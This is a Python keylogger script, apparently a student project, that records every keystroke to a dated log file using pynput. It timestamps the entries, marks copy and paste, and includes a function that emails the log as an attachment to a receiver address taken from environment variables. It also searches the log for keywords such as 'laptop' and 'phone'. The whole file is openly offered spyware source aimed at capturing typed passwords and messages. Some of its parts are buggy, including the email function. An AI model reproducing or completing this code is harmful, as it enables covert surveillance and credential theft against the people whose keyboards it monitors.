from pynput import keyboard
from pynput.keyboard import Key
from datetime import datetime
import pyperclip
import string
import atexit

import signal

import os

from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import smtplib


def cleanup_function():
    # Perform cleanup actions or trigger desired function
    search()

def stamp(fp, prev, init=False, gap=10):
    now = datetime.now()
    if init:
        fp.write(f"\n[{now}] ")
        return now
    delta = now - prev
    if delta.seconds >= gap:
        fp.write(f"\n[{now}] ")
        return now
    return prev

def get_clipboard_contents():
    return pyperclip.paste()

def keyPressed(key):
    global last, new, filename

    with open(f"{filename}.txt", 'a') as logKey:
        last = stamp(logKey, last, new, gap=60)
        new = False
        try:
            char = key.char
            if char in string.printable:
                #print("printable")
                logKey.write(char)
            else:
                char = char.encode('utf-8')
                # print(str(key), char.encode('utf-8'))
                if char == b'\x03':
                    logKey.write("<ctrl-c>")
                    # clipboard_contents = get_clipboard_contents()
                    # logKey.write(f"[Clipboard: {clipboard_contents}]")
                elif char == b'\x16':
                    logKey.write("<ctrl-v>")


        except Exception as ex:
            # print(ex)
            if str(key) == "Key.enter":
                logKey.write("\n" + " "*29)
            elif str(key) == "Key.space":
                logKey.write(" ")
            # elif str(key) == "Key.print_screen":
            #     logKey.write("")
            elif "Key.ctrl_" in str(key):
                 pass
            elif "Key.shift" in str(key):
                 pass

            # elif str(key) == "Key.backspace":
            #         if logKey.tell() > 0:
            #             logKey.seek(logKey.tell() - 1)
            #             logKey.truncate()
            else:
                 logKey.write(f"<{str(key)}>")
    # string to search in file
    # words = ['laptop', 'phone']
    # with open(r"C:\Users\USER\PycharmProjects\fyp\keyfile.txt", 'r') as logKey:
    #     content = logKey.read()
    # # Iterate list to find each word
    # for word in words:
    #     if word in content:
    #         print('string exist in a file')
    #     else:
    #         break
def on_release(key):
    if key == Key.esc:
        print("Escape key pressed. Stopping listener...")
        exit()

def send_email():
    # Getting the email from the environ file
    email_sender = os.environ.get("EMAIL_SENDER")
    email_password = os.environ.get("EMAIL_PASSWORD")
    email_receiver = os.environ.get("EMAIL_RECEIVER")
    smtp_server = os.environ.get("SMTP_SERVER")
    port = int(os.environ.get("PORT"))

    # Subject and body of the email
    subject = "Keylog"
    body = """
    Testing Keylogger txt file
    """


    email = MIMEMultipart()
    email["From"] = email_sender
    email["To"] = email_receiver
    email["Subject"] = subject

    email.attach(MIMEText(body, "plain"))

    # Define the file to attach
    file = f"{filename}.txt"

    # Encode as base 64
    with open("keyfile.txt", 'a') as f:
        attachment_package = MIMEBase('application', 'octet-stream')
        attachment_package.set_payload(f.read())
        encoders.encode_base64(attachment_package)
        attachment_package.add_header('Content-Disposition', "attachment; filename= " + file)
        email.attach(attachment_package)

    with smtplib.SMTP_SSL(smtp_server, port) as smtp:
        smtp.starttls()
        smtp.login(email_sender, email_password)
        smtp.sendmail(email_sender, email_receiver, email.as_string())

def search():
    words = ['laptop', 'phone']
    with open(rf"C:\Users\USER\PycharmProjects\fyp\{filename}.txt", 'r') as logKey:
        content = logKey.read()
    # Iterate list to find each word
    for word in words:
        if word in content:
            print('string exist in a file')




if __name__ == "__main__":
    dt = datetime.now()
    filename = dt.strftime("%Y-%m-%d")

    last = None
    new = True
    with keyboard.Listener(on_press=keyPressed, on_release=on_release) as l:
        l.join()
    atexit.register(cleanup_function)

    # clipboard_contents = get_clipboard_contents()
    # print(clipboard_contents)
    # listener = keyboard.Listener(on_press=keyPressed)
    # listener.start()
    # input()
